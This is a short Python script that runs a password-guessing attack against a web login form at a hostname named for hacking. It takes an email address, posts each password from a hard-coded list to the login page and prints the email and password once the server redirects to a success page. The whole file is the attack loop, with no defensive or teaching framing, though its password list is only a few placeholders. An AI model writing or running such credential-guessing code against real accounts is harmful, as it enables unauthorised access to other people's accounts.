import requests

def login(email, password):
    # URL of the login page
    login_url = 'http://hacking122.rf.gd/login.html'

    # Data to be sent in the POST request
    login_data = {
        'email': email,
        'password': password
    }

    # Send POST request to login
    response = requests.post(login_url, data=login_data)

    # Check if login was successful by inspecting the response URL
    if response.url == 'http://hacking122.rf.gd/success.php':
        print("Login successful!")
        print("Email:", email)
        print("Password:", password)
        return True
    else:
        print("Login failed with password:", password)
        return False

def main():
    # Prompt user for email
    email = input("Enter email: ")

    # List of passwords to try
    passwords = [
        "password1",
        "password2",
        "sgdku",
        # Add more passwords as needed
    ]

    # Attempt login with each password
    for password in passwords:
        if login(email, password):
            # Exit loop if login is successful
            break
    else:
        # This part runs if none of the passwords were successful
        print("All password attempts failed. Unable to login.")

if __name__ == "__main__":
    main()
